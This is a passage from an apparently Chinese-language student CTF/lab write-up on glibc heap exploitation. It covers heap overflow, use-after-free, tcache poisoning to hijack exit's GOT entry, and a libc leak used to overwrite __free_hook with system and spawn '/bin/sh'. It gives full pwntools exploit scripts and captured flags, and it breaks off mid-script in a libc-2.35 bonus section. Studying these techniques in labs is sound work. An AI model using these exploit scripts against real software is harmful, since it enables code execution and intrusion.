 p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b"password &gt; "</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line">    p.recvuntil(<span class="string">b"introduction &gt; "</span>)</span><br><span class="line">    p.sendline(intro)</span><br><span class="line">    p.recvuntil(<span class="string">b"motto &gt; "</span>)</span><br><span class="line">    p.sendline(motto)</span><br><span class="line">    p.recvuntil(<span class="string">b"at index "</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    data = p.recvline().strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_del</span>(<span class="params">index: <span class="built_in">int</span>, password: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    p.recvuntil(<span class="string">b"[ 5 ] leave\n&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">b"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index &gt; "</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b"password &gt; "</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_show</span>(<span class="params">index: <span class="built_in">int</span>, password: <span class="built_in">bytes</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bytes</span>, <span class="built_in">bytes</span>, <span class="built_in">bytes</span>]:</span><br><span class="line">    p.recvuntil(<span class="string">b"[ 5 ] leave\n&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">b"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index &gt; "</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b"password &gt; "</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line">    p.recvuntil(<span class="string">b"user name: "</span>)</span><br><span class="line">    recv_name = p.recvline().strip()</span><br><span class="line">    p.recvuntil(<span class="string">b"user motto: "</span>)</span><br><span class="line">    recv_motto = p.recvline().strip()</span><br><span class="line">    p.recvuntil(<span class="string">b"user intro: "</span>)</span><br><span class="line">    recv_intro = p.recvline().strip()</span><br><span class="line">    <span class="keyword">return</span> recv_name, recv_motto, recv_intro</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_edit</span>(<span class="params"></span></span><br><span class="line"><span class="params">    index: <span class="built_in">int</span>, password: <span class="built_in">bytes</span>, edit_name: <span class="built_in">bytes</span>, edit_intro: <span class="built_in">bytes</span>, edit_motto: <span class="built_in">bytes</span></span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b"[ 5 ] leave\n&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">b"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index &gt; "</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b"password &gt; "</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b"new name &gt; "</span>)</span><br><span class="line">    p.sendline(edit_name)</span><br><span class="line">    p.recvuntil(<span class="string">b"new introduction &gt; "</span>)</span><br><span class="line">    p.sendline(edit_intro)</span><br><span class="line">    p.recvuntil(<span class="string">b"new motto &gt; "</span>)</span><br><span class="line">    p.sendline(edit_motto)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID_validation</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b"Please input your StudentID:\n"</span>, <span class="built_in">str</span>(<span class="number">3220105108</span>))</span><br><span class="line"></span><br><span class="line">ID_validation()</span><br><span class="line"></span><br><span class="line">handle_add(<span class="string">b"1"</span>, <span class="string">b"1"</span>, <span class="string">b"A"</span> * <span class="number">0x10</span>, <span class="string">b"1"</span>)</span><br><span class="line">handle_show(<span class="number">0</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>本地运行：（本地没有设置<code>flag</code>环境变量）</p>
+<p><img src="/2025/06/26/Ssec/image-20241105145045535.png"></p>
+<p>远程运行：</p>
+<p><img src="/2025/06/26/Ssec/image-20241105145116923.png"></p>
+<p>flag: <code>flag{hE4P_cAN_be_DIR7y_4s_5T4CK}</code></p>
+<h3 id="overflow">Overflow</h3>
+<p>在本题的程序中，<code>add</code>函数指定intro的size大小为<code>0x40</code>， 但是<code>edit</code>函数中缺能够修改<code>0x60</code>， 有一个堆溢出漏洞。</p>
+<p>申请两个<code>info</code>的结构体，用<code>gdb</code>调试，观察堆块布局如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">handle_add(<span class="string">b"heap_1"</span>, <span class="string">b"1"</span>, <span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 0</span></span><br><span class="line">handle_add(<span class="string">b"heap_2"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/06/26/Ssec/image-20241105150650078.png"></p>
+<p>所以我们可以通过溢出第一个info的<code>intro</code>堆块，覆盖到下一个<code>info</code>堆块的<code>name</code>字段。</p>
+<p>溢出前：</p>
+<p><img src="/2025/06/26/Ssec/image-20241105150901889.png"></p>
+<p>溢出后：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handle_edit(<span class="number">0</span>, <span class="string">b"1"</span>, <span class="string">b"heap_1"</span>, payload, <span class="string">b"1"</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/06/26/Ssec/image-20241105151042308.png"></p>
+<p><code>show</code>一下第二个堆块，发现<code>name</code>已经变成了<code>A * 0x10</code>了。</p>
+<p><img src="/2025/06/26/Ssec/image-20241105151117672.png"></p>
+<p>触发漏洞的<code>exp</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">handle_add(<span class="string">b"heap_1"</span>, <span class="string">b"1"</span>, <span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 0</span></span><br><span class="line">handle_add(<span class="string">b"heap_2"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">0x40</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += <span class="string">b"A"</span> * <span class="number">0xf</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">handle_edit(<span class="number">0</span>, <span class="string">b"1"</span>, <span class="string">b"heap_1"</span>, payload, <span class="string">b"1"</span>)</span><br><span class="line">handle_show(<span class="number">1</span>, <span class="string">b"1"</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="uaf">UAF</h3>
+<h4 id="释放后读写">释放后读/写</h4>
+<p>在本程序中，free掉<code>info</code>之后不会将列表里面相应的位置置空，而且在<code>add</code>函数中可以自定义<code>intro</code>的大小：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">user_add</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"introduction size &gt; "</span>);</span><br><span class="line">    <span class="type">int</span> intro_size;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;intro_size);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">}</span><br><span class="line"><span class="type">void</span> <span class="title function_">user_del</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="built_in">free</span>(info-&gt;intro);</span><br><span class="line">    <span class="built_in">free</span>(info);</span><br><span class="line">    <span class="comment">// infos[index] = NULL;</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+<p>我们首先申请两个<code>info</code>， 并将他们free掉， gdb调试堆块布局如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">handle_add(<span class="string">b"heap_1"</span>, <span class="string">b"1"</span>, <span class="number">0x80</span> ,<span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 0</span></span><br><span class="line">handle_add(<span class="string">b"heap_2"</span>, <span class="string">b"1"</span>, <span class="number">0x80</span> ,<span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br><span class="line">handle_del(<span class="number">0</span>, <span class="string">b"1"</span>)</span><br><span class="line">handle_del(<span class="number">1</span>, <span class="string">b"1"</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/06/26/Ssec/image-20241105155920020.png"></p>
+<p>再申请一个<code>info</code> ，注意，这里的<code>intro_size</code>要和<code>info</code>结构体的大小相同。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handle_add(<span class="string">b"heap_3"</span>, <span class="string">b"1"</span>, <span class="number">0x60</span> ,<span class="string">b"B"</span> * <span class="number">0x30</span>, <span class="string">b"1"</span>) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2025/06/26/Ssec/image-20241105160036751.png"></p>
+<p>可以看到，我们第三个<code>info</code>里的<code>info-&gt;intro</code> 申请到了第一个<code>info</code>结构体。这样我们就可以通过操控<code>info[2]-&gt;intro</code>de内容，控制<code>info[0]</code>里面的内容，进一步控制<code>info[0]-&gt;intro</code> ，利用UAF完成任意地址申请读/写。</p>
+<p>验证：现在我们<code>info[0]-&gt;password</code>字段已经被覆盖为了<code>B * 0x10 + "\n"</code>, 通过这个<code>password</code>我们可以泄露/覆写<code>info[0]-&gt;intro</code>中的内容：</p>
+<blockquote>
+<p>换句话说，就是<code>info[2]-&gt;intro</code>和<code>info[0]</code>指向了同一个堆块。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handle_show(<span class="number">2</span>, <span class="string">b"1"</span>)</span><br></pre></td></tr></table></figure>
+<p>可以通过查看<code>info[2]-&gt;intro</code>来泄露<code>info[0]</code>里面的内容，包括泄露<code>info[0]-&gt;intro</code>的地址，以及可以通过<code>info[0]</code>来泄露已经free掉的<code>info[0]-&gt;intro</code>里面的内容， 完成<code>UAF</code>漏洞的触发</p>
+<p><img src="/2025/06/26/Ssec/image-20241105162115730.png"></p>
+<p>触发漏洞的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">handle_add(<span class="string">b"heap_1"</span>, <span class="string">b"1"</span>, <span class="number">0x80</span> ,<span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 0</span></span><br><span class="line">handle_add(<span class="string">b"heap_2"</span>, <span class="string">b"1"</span>, <span class="number">0x80</span> ,<span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">handle_del(<span class="number">0</span>, <span class="string">b"1"</span>)</span><br><span class="line">handle_del(<span class="number">1</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"C"</span> * <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">handle_add(<span class="string">b"heap_3"</span>, <span class="string">b"1"</span>, <span class="number">0x60</span> ,payload, <span class="string">b"1"</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"C"</span> * <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">handle_show(<span class="number">2</span>, <span class="string">b"1"</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="堆上漏洞的利用">堆上漏洞的利用</h2>
+<h3 id="task-1-3">Task 1</h3>
+<p>checksec一下程序，没有开PIE，并且是<code>partial relro</code>的，可以通过堆溢出到已free <code>tcache bin</code>的<code>fd</code>指针，控制堆块进一步分配的地址，覆盖<code>exit</code>函数的<code>GOT</code>表为<code>backdoor</code>函数的地址。之后通过<code>exit</code>的系统调用即可<code>getshell</code></p>
+<p>本题的<code>exp</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">"./overflow"</span>)</span><br><span class="line"></span><br><span class="line">p = process(elf.path)</span><br><span class="line"><span class="comment"># p = remote("8.154.20.109", 10400)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID_validation</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b"Please input your StudentID:\n"</span>, <span class="built_in">str</span>(<span class="number">3220105108</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ID_validation()</span></span><br><span class="line"></span><br><span class="line">handle_add(<span class="string">b"heap_1"</span>, <span class="string">b"1"</span>, <span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 0</span></span><br><span class="line">handle_add(<span class="string">b"heap_2"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br><span class="line">handle_add(<span class="string">b"heap_3"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">handle_del(<span class="number">0</span>, <span class="string">b"1"</span>)</span><br><span class="line">handle_del(<span class="number">2</span>, <span class="string">b"1"</span>)</span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">0x40</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload += p64(elf.got[<span class="string">"exit"</span>])</span><br><span class="line">handle_edit(<span class="number">1</span>, <span class="string">b"1"</span>, <span class="string">b"heap_1"</span>, payload, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">handle_add(<span class="string">b"heap_2"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">name = p64(elf.sym[<span class="string">"backdoor"</span>])</span><br><span class="line">handle_add(name, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) </span><br><span class="line">handle_add(name, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b"&gt; "</span>, <span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>首先申请三个堆块，并将第一个和第三个堆块free掉，使得<code>info[0]</code>和<code>info[2]</code>进入<code>tcachebin</code>中，并且让该条链子上的<code>count</code>为2</li>
+<li>通过溢出第一个堆块的<code>intro</code>，打到第三个堆块的<code>fd</code>字段，覆盖其为<code>elf.got["exit"]</code></li>
+<li>连续申请两个堆块，将<code>exit</code>的<code>got</code>表覆写为<code>backdoor</code>函数的地址，之后让程序执行<code>exit</code>退出，完成利用。</li>
+</ul>
+<p>本地运行：</p>
+<p><img src="/2025/06/26/Ssec/image-20241105164318679.png"></p>
+<p>远程执行<code>flag.exe</code>程序：</p>
+<p><img src="/2025/06/26/Ssec/image-20241105164421002.png"></p>
+<p>flag: <code>ssec2023{FreElisT_hijackINg_Is_pOwERful|467155bb}</code></p>
+<h3 id="task-2-3">Task 2</h3>
+<p>写到这里发现其实<code>fd</code>和<code>bk</code>的置位不会影响<code>info</code>的password字段。同时checksec发现本题开启了pie保护，并且是<code>full relro</code>的，也就是我们无法通过劫持<code>got</code>去控制程序流。</p>
+<p><code>libc-2.31</code>中存在两个字段，分别为<code>__free_hook</code>和<code>__malloc_hook</code>, 在程序执行<code>malloc</code>和<code>free</code>函数时，会首先检查<code>__malloc_hook</code>和<code>__free_hook</code>两个字段是否为空，如果不是空的话，将其当做一个函数指针，去执行这个函数。</p>
+<p>所以我们可以通过泄露<code>libc</code>地址，利用UAF漏洞控制<code>__free_hook</code>或<code>__malloc_hook</code> ，进而劫持程序流。</p>
+<p>本题exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">"./uaf"</span>)</span><br><span class="line"></span><br><span class="line">p = process(elf.path)</span><br><span class="line"><span class="comment"># p = remote("8.154.20.109", 10400)</span></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.31.so"</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ID_validation</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b"Please input your StudentID:\n"</span>, <span class="built_in">str</span>(<span class="number">3220105108</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ID_validation()</span></span><br><span class="line"></span><br><span class="line">handle_add(<span class="string">b"heap_1"</span>, <span class="string">b"1"</span>, <span class="number">0x800</span> ,<span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 0</span></span><br><span class="line">handle_add(<span class="string">b"heap_2"</span>, <span class="string">b"1"</span>, <span class="number">0x80</span> ,<span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">handle_del(<span class="number">0</span>, <span class="string">b"1"</span>)</span><br><span class="line">_, _, unsorted_leak = handle_show(<span class="number">0</span>, <span class="string">b"1"</span>)</span><br><span class="line"><span class="built_in">print</span>(unsorted_leak)</span><br><span class="line">libc_base = u64(unsorted_leak[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>)) - (<span class="number">0x7f44a7af2be0</span> - <span class="number">0x7f44a7906000</span>)</span><br><span class="line">success(<span class="string">f"libc_base =&gt; <span class="subst">{<span class="built_in">hex</span>(libc_base)}</span>"</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line">handle_add(<span class="string">b"heap_3"</span>, <span class="string">b"1"</span>, <span class="number">0x80</span> ,<span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 2</span></span><br><span class="line">handle_add(<span class="string">b"heap_4"</span>, <span class="string">b"1"</span>, <span class="number">0x80</span> ,<span class="string">b"A"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">handle_del(<span class="number">3</span>, <span class="string">b"1"</span>)</span><br><span class="line">handle_del(<span class="number">2</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(free_hook)</span><br><span class="line">handle_edit(<span class="number">2</span>, <span class="string">b"1"</span>, <span class="string">b"\x00"</span>, payload, <span class="string">b"1"</span>) </span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">handle_add(<span class="string">b"heap_5"</span>, <span class="string">b"1"</span>, <span class="number">0x80</span> ,<span class="string">b"A"</span>, <span class="string">b"1"</span>) <span class="comment"># 4</span></span><br><span class="line">handle_add(<span class="string">b"heap_6"</span>, <span class="string">b"1"</span>, <span class="number">0x80</span> ,payload , <span class="string">b"1"</span>) <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">handle_add(<span class="string">b"heap_7"</span>, <span class="string">b"1"</span>, <span class="number">0x80</span>, <span class="string">b"/bin/sh\x00"</span>, <span class="string">b"1"</span>) <span class="comment"># 6</span></span><br><span class="line">handle_del(<span class="number">6</span>, <span class="string">b"1"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<ul>
+<li>首先利用堆块分配的特性，给<code>intro</code>申请一个大堆块并将其free掉，这样这个堆块就会进入<code>unsorted bin</code> ，通过UAF漏洞，show出这个堆块里面的内容，进而泄露<code>libc</code>地址</li>
+</ul>
+<blockquote>
+<p>当<code>unsorted bin</code>环形链表中只有一个堆块时，这个堆块的<code>fd</code>和<code>bk</code>指针都指向<code>main_arena + 0x88</code>这个地址位于<code>libc</code>加载的地址区间，所以可以通过这个值来泄露libc的地址。</p>
+<p>并且在free之前一定掉再申请一个堆块将<code>heap_1</code>和<code>TOP_chunk</code>隔开，防止free出来的<code>unsorted bin</code> 和<code>TOP_chunk</code>合并</p>
+</blockquote>
+<ul>
+<li>接着再申请两个堆块，<code>intro</code>size分配小一点，这样把他们free掉之后就可以让他们顺利进入<code>tcache bin</code>中，通过UAF漏洞，修改<code>heap2-&gt;intro-&gt;fd</code>为<code>__free_hook</code>, 让<code>tcache bin</code>断链</li>
+</ul>
+<blockquote>
+<p>这里为什么要把<code>heap2-&gt;name</code>字段置为<code>\x00</code>：</p>
+<p>因为这里的<code>heap2</code>是被free掉的，也就是<code>heap_2-&gt;name</code>字段实际上是<code>heap_2-&gt;fd</code> 。我们必须保证这个<code>fd</code>是个合法的可读写地址。所以我们这里就改一个字节，让<code>fd</code>的偏移不大，也会落在合法地址内，保证了后续分配操作的合法性。</p>
+<p><img src="/2025/06/26/Ssec/image-20241105172256101.png"></p>
+</blockquote>
+<ul>
+<li>最后连续申请两个堆块，覆盖<code>__free_hook</code>为<code>system</code>。利用在<code>heap_7-&gt;intro</code>中放置好的 <code>/bin/sh</code>字符串，触发<code>free(heap_7-&gt;intro) =&gt; system(heap_7-&gt;intro) =&gt; system("/bin/sh")</code> 获取shell，完成利用。</li>
+</ul>
+<p>本地运行：</p>
+<p><img src="/2025/06/26/Ssec/image-20241105173837288.png"></p>
+<p>远程运行<code>flag.exe</code>:</p>
+<p><img src="/2025/06/26/Ssec/image-20241105173915900.png"></p>
+<p>flag: <code>ssec2023{1_L0ve_tyP3_COnFU510N_s0_muCh|69c6ea81}</code></p>
+<h2 id="bonus-1">Bonus</h2>
+<p>简单的2.35堆溢出，用IDA逆向题目，发现留了一个后门函数，并且所有的函数配置和<code>overflow</code>题目大差不差。</p>
+<p>相较于<code>overflow</code>题目，本题比较难办的点在于：</p>
+<ul>
+<li><code>libc2.35</code>版本下有<code>tcache bin</code>的堆指针加密异或，所以我们在控<code>fd</code>之前需要去获取堆地址</li>
+<li><code>libc2.35</code>下去除了<code>__malloc_hook</code>和<code>__free_hook</code>，所以本题需要打一些更高级的手法。</li>
+</ul>
+<blockquote>
+<p>因为本题限制了能分配chunk的大小，如果打IO的话对于vtable的排布会特别麻烦。所以这里选择打<code>environ</code></p>
+</blockquote>
+<p><img src="/2025/06/26/Ssec/image-20241106174326517.png"></p>
+<p>题目的漏洞和<code>overflow</code>大体一样，都是可以溢出<code>intro</code>堆块的<code>0x20</code>字节，这<code>0x20</code>字节我们可以做两件事：</p>
+<ul>
+<li>可以覆盖下一个堆块的<code>size</code>位，让该堆块在free的时候进入他本不该进入的堆类</li>
+<li>可以覆盖下一个<code>free</code>堆块的<code>fd</code>指针，在已知堆块地址的情况下可以进行任意地址读写。</li>
+</ul>
+<p>本题的思路如下：</p>
+<ul>
+<li>Prepare：把列表分配满，保证堆块与堆块之间的地址相邻，为之后的操作做准备。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stack leak</span></span><br><span class="line">index_0 = handle_add(<span class="string">b"heap_0"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 0</span></span><br><span class="line">index_1 = handle_add(<span class="string">b"heap_1"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 1</span></span><br><span class="line">index_2 = handle_add(<span class="string">b"heap_2"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stack attack</span></span><br><span class="line">index_3 = handle_add(<span class="string">b"heap_3"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 3</span></span><br><span class="line">index_4 = handle_add(<span class="string">b"heap_4"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 4</span></span><br><span class="line">index_5 = handle_add(<span class="string">b"heap_5"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 5</span></span><br><span class="line">index_6 = handle_add(<span class="string">b"heap_6"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc / heap leak</span></span><br><span class="line">index_7 = handle_add(<span class="string">b"heap_7"</span>, <span class="string">b"1"</span>, <span class="string">b"B"</span> * <span class="number">0x20</span>, <span class="string">b"1"</span>) <span 